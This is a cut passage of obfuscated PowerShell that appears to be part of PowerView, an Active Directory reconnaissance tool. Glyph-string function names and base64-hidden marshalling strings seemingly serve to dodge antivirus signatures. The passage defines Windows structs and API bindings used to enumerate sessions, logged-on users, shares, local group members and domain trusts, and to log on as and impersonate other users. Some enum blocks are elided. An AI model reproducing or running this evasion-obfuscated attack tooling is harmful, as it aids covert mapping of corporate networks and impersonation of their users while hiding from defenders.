    State = ___/=====\/\/\/\/\ 1 $WTSConnectState
    SessionId = ___/=====\/\/\/\/\ 2 UInt32
    pSessionName = ___/=====\/\/\/\/\ 3 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = ___/=====\/\/\/\/\ 4 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = ___/=====\/\/\/\/\ 5 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = ___/=====\/\/\/\/\ 6 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = ___/=====\/\/\/\/\ 7 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$WTS_CLIENT_ADDRESS = _/==\/=\/\/===\_/\ $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = ___/=====\/\/\/\/\ 0 UInt32
    Address = ___/=====\/\/\/\/\ 1 Byte[] -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
$SHARE_INFO_1 = _/==\/=\/\/===\_/\ $Mod PowerView.ShareInfo @{
    Name = ___/=====\/\/\/\/\ 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Type = ___/=====\/\/\/\/\ 1 UInt32
    Remark = ___/=====\/\/\/\/\ 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$WKSTA_USER_INFO_1 = _/==\/=\/\/===\_/\ $Mod PowerView.LoggedOnUserInfo @{
    UserName = ___/=====\/\/\/\/\ 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonDomain = ___/=====\/\/\/\/\ 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    AuthDomains = ___/=====\/\/\/\/\ 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonServer = ___/=====\/\/\/\/\ 3 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$SESSION_INFO_10 = _/==\/=\/\/===\_/\ $Mod PowerView.SessionInfo @{
    CName = ___/=====\/\/\/\/\ 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    UserName = ___/=====\/\/\/\/\ 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Time = ___/=====\/\/\/\/\ 2 UInt32
    IdleTime = ___/=====\/\/\/\/\ 3 UInt32
}
$SID_NAME_USE = _/=\/\_/===\/=\_/= $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
...
$LOCALGROUP_INFO_1 = _/==\/=\/\/===\_/\ $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = ___/=====\/\/\/\/\ 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lgrpi1_comment = ___/=====\/\/\/\/\ 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$LOCALGROUP_MEMBERS_INFO_2 = _/==\/=\/\/===\_/\ $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = ___/=====\/\/\/\/\ 0 IntPtr
    lgrmi2_sidusage = ___/=====\/\/\/\/\ 1 $SID_NAME_USE
    lgrmi2_domainandname = ___/=====\/\/\/\/\ 2 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$DsDomainFlag = _/=\/\_/===\/=\_/= $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
...
$DsDomainTrustType = _/=\/\_/===\/=\_/= $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$DsDomainTrustAttributes = _/=\/\_/===\/=\_/= $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
...
$DS_DOMAIN_TRUSTS = _/==\/=\/\/===\_/\ $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = ___/=====\/\/\/\/\ 0 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    DnsDomainName = ___/=====\/\/\/\/\ 1 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Flags = ___/=====\/\/\/\/\ 2 $DsDomainFlag
    ParentIndex = ___/=====\/\/\/\/\ 3 UInt32
    TrustType = ___/=====\/\/\/\/\ 4 $DsDomainTrustType
    TrustAttributes = ___/=====\/\/\/\/\ 5 $DsDomainTrustAttributes
    DomainSid = ___/=====\/\/\/\/\ 6 IntPtr
    DomainGuid = ___/=====\/\/\/\/\ 7 Guid
}
$NETRESOURCEW = _/==\/=\/\/===\_/\ $Mod NETRESOURCEW @{
    dwScope =         ___/=====\/\/\/\/\ 0 UInt32
    dwType =          ___/=====\/\/\/\/\ 1 UInt32
    dwDisplayType =   ___/=====\/\/\/\/\ 2 UInt32
    dwUsage =         ___/=====\/\/\/\/\ 3 UInt32
    lpLocalName =     ___/=====\/\/\/\/\ 4 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpRemoteName =    ___/=====\/\/\/\/\ 5 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpComment =       ___/=====\/\/\/\/\ 6 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpProvider =      ___/=====\/\/\/\/\ 7 String -MarshalAs @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
$FunctionDefinitions = @(
    (__/=\_/==\/\__/\/\ netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/=\_/==\/\__/\/\ netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/=\_/==\/\__/\/\ netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/=\_/==\/\__/\/\ netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/=\_/==\/\__/\/\ netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/=\_/==\/\__/\/\ netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (__/=\_/==\/\__/\/\ netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (__/=\_/==\/\__/\/\ netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (__/=\_/==\/\__/\/\ advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (__/=\_/==\/\__/\/\ advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (__/=\_/==\/\__/\/\ advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (__/=\_/==\/\__/\/\ advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (__/=\_/==\/\__/\/\ advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (__/=\_/==\/\__/\/\ advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (__/=\_/==\/\__/\/\ wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (__/=\_/==\/\__/\/\ wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (__/=\_/==\/\__/\/\ wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (__/=\_/==\/\__/\/\ wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (__/=\_/==\/\__/\/\ wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (__/=\_/==\/\__/\/\ wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (__/=\_/==\/\__/\/\ Mpr WNetAddConnection2W ([Int]) @($NETRESOURCEW, [String], [String], [UInt32])),
    (__/=\_/==\/\__/\/\ Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (__/=\_/==\/\__/\/\ kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | ____/=====\/\_/\/\ -Module $Mod -Namespace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
